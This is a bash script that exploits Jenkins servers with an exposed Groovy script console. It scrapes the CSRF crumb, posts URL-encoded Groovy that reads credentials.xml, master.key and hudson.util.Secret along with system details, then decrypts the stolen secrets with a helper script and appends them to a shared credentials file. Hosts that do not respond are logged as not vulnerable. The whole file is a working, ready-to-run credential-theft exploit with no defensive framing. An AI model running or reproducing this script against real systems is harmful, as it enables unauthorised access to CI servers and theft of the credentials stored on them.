#!/bin/bash

host=$1

echo $host

#process = "cat /var/jenkins_home/credentials.xml".execute()
#println ":cmd1:${process.text}:cmd1:"
#process = "cat /var/jenkins_home/secrets/master.key".execute()
#println ":cmd2:${process.text}:cmd2:"
#process = "xxd /var/jenkins_home/secrets/hudson.util.Secret".execute()
#println ":cmd3:${process.text}:cmd3:"
#process = "uname -ar".execute()
#println ":cmd4:${process.text}:cmd4:"
#process = "ls -al /tmp".execute()
#println ":cmd5:${process.text}:cmd5:"
#process = "cat /etc/os-release".execute()
#println ":cmd6:${process.text}:cmd6:"

mkdir -p jenkins_data/$host
cd jenkins_data/$host

curl -k -s -m 5 \
-H "Host: ${host}:8080" \
-H 'Accept: text/html' \
"http://${host}:8080/script" \
--output get-response.txt

#Might need to change this for older versions of jenkins
jenkins_crumb=$(perl -lne 'BEGIN{undef $/} while (/<script>crumb.init((.*?))<\/script>/sg){print $1}' get-response.txt | cut -d "," -f 2 | sed 's/");//g' | sed 's/ "//g')

echo $jenkins_crumb

if [ ! -z "$jenkins_crumb" ]
then

	read -d '' scriptdata <<- "_EOM_"
		process%20%3D%20%22cat%20%2Fvar%2Fjenkins_home%2Fcredentials.xml%22.execute%28%29%0Aprintln%20%22%3Acmd1%3A%24%7Bprocess.text%7D%3Acmd1%3A%22%0Aprocess%20%3D%20%22cat%20%2Fvar%2Fjenkins_home%2Fsecrets%2Fmaster.key%22.execute%28%29%0Aprintln%20%22%3Acmd2%3A%24%7Bprocess.text%7D%3Acmd2%3A%22%0Aprocess%20%3D%20%22xxd%20%2Fvar%2Fjenkins_home%2Fsecrets%2Fhudson.util.Secret%22.execute%28%29%0Aprintln%20%22%3Acmd3%3A%24%7Bprocess.text%7D%3Acmd3%3A%22%0Aprocess%20%3D%20%22uname%20-ar%22.execute%28%29%0Aprintln%20%22%3Acmd4%3A%24%7Bprocess.text%7D%3Acmd4%3A%22%0Aprocess%20%3D%20%22ls%20-al%20%2Ftmp%22.execute%28%29%0Aprintln%20%22%3Acmd5%3A%24%7Bprocess.text%7D%3Acmd5%3A%22%0Aprocess%20%3D%20%22cat%20%2Fetc%2Fos-release%22.execute%28%29%0Aprintln%20%22%3Acmd6%3A%24%7Bprocess.text%7D%3Acmd6%3A%22
_EOM_

	echo $host is vulnerable! Gathering data!
	curl -s -k -X 'POST' \
	-H "Host: ${host}:8080" \
	-H 'Accept: text/html' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	--data-binary "script=$scriptdata&Jenkins-Crumb=$jenkins_crumb&Submit=Run" \
	"http://${host}:8080/scriptText" \
	--output response.txt

	perl -lne 'BEGIN{undef $/} while (/:cmd1:(.*?):cmd1:/sg){print $1}' response.txt > credentials.xml

	perl -lne 'BEGIN{undef $/} while (/:cmd2:(.*?):cmd2:/sg){print $1}' response.txt | tr -d "\t\n\r" > master.key

	perl -lne 'BEGIN{undef $/} while (/:cmd3:(.*?):cmd3:/sg){print $1}' response.txt | xxd -r > hudson.util.Secret
	echo $host >> ../../allcreds.txt
	ruby ../../decrypt_jenkins.rb master.key hudson.util.Secret credentials.xml >> ../../allcreds.txt
else
	echo $host is not vulnerable. Continue on.
	rm -rf jenkins_data/$host
	echo $host >> ../../not-vulnerable.txt
fi
